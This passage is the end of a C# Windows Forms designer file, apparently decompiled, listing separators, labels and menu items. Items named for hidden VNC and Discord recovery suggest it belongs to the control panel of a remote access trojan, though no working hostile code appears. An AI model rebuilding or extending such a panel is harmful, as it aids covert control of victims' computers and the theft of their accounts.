		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator23;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator24;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator25;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator15;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator16;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator17;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator18;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator19;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator20;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator21;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator22;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator26;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator27;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator28;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator29;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator30;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator31;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator32;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator33;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator34;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator35;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator36;

		private global::System.Windows.Forms.ToolStripMenuItem justForFunToolStripMenuItem;

		private global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;

		private global::System.Windows.Forms.ColumnHeader columnHeader1;

		private global::System.Windows.Forms.ToolStripMenuItem moveToHVNCToolStripMenuItem;

		private global::Guna.UI2.WinForms.Guna2Separator guna2Separator1;

		private global::Guna.UI2.WinForms.Guna2Separator guna2Separator4;

		private global::System.Windows.Forms.Label label3;

		private global::System.Windows.Forms.Label label2;

		private global::System.Windows.Forms.ToolStripMenuItem discordToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripMenuItem DiscordRecoveryToolStripMenuItem;

		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator37;
	}
}
